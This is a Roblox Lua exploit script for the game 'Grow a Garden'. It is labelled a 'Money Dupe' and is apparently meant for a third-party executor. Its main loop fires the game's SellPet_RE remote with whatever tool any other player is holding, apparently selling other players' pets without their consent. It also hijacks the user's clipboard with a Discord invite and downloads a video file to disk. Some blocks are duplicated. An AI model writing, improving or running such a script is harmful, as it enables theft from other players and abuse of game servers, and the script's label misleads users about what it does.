local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local localPlayer = Players.LocalPlayer

RunService.Heartbeat:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            if character then
                local tool = character:FindFirstChildOfClass("Tool")
                if tool then
                    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(tool)
                end
            end
        end
    end
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Grow a garden Money Dupe - Made by Ribbined!";
    Text = "Discord invite copied to clipboard 😎 PLEASE JOIN WE ALMOST GOT 1K MEMBERS!!";
    Duration = 15;
})
toclipboard("https://discord.gg/5nWJ8ZMaXk")

local url = "https://github.com/CorpseCMD/MyScripts/raw/refs/heads/main/tutorial%20(online-video-cutter.com).mp4"
local filename = "ribbined_GrowAGardenScriptTutorial1.mp4"

if not isfile(filename) then
    local request = syn and syn.request or http_request
    local result = request({
        Url = url,
        Method = "GET"
    })
    writefile(filename, result.Body)
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Grow a garden Money Dupe - Made by Ribbined!";
    Text = "Discord invite copied to clipboard 😎 PLEASE JOIN WE ALMOST GOT 1K MEMBERS!!";
    Duration = 15;
})
toclipboard("https://discord.gg/5nWJ8ZMaXk")

local url = "https://github.com/CorpseCMD/MyScripts/raw/refs/heads/main/tutorial%20(online-video-cutter.com).mp4"
local filename = "ribbined_GrowAGardenScriptTutorial1.mp4"

if not isfile(filename) then
    local request = syn and syn.request or http_request
    local result = request({
        Url = url,
        Method = "GET"
    })
    writefile(filename, result.Body)
end

local playTutorialBindable = Instance.new("BindableFunction")

playTutorialBindable.OnInvoke = function()
    -- GUI setup
    local gui = Instance.new("ScreenGui")
    gui.Name = "TutorialGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 99
    gui.Parent = game:GetService("CoreGui")

    local video = Instance.new("VideoFrame")
    video.AnchorPoint = Vector2.new(0.5,0.5)
    video.Size = UDim2.new(.5, 0, .5, 0)
    video.Position = UDim2.new(.6, 0, .3, 0)
    video.BackgroundTransparency = 1
    local custom = getcustomasset(filename)
    print("custom asset: "..custom)
    video.Video = custom
    video.Parent = gui
    local uist = Instance.new("UIStroke")
    uist.Parent = video
    uist.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    uist.Thickness = 2.5
    uist.Transparency = 0.25

    while not video.IsLoaded do task.wait() end
    task.wait(0.5)

    video:Play()
    video.Ended:Wait()
    video:Destroy()
    -- End message
    local label = Instance.new("TextLabel")
    label.TextScaled = true
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "Reload the script when ready.\nRemember it only works IF someone is holding a pet!"
     local uist = Instance.new("UIStroke")
    uist.Parent = video
    uist.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    uist.Thickness = 2.5
    uist.Transparency = 0.25
    uist.Color = Color3.new(0.7,0.7,0.7)
    label.Parent = gui

    task.wait(5)
    gui:Destroy()
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "How to use",
    Text = "Click 'Play' to watch the tutorial in game!",
    Duration = 10,
    Button1 = "Play",
    Callback = playTutorialBindable
})

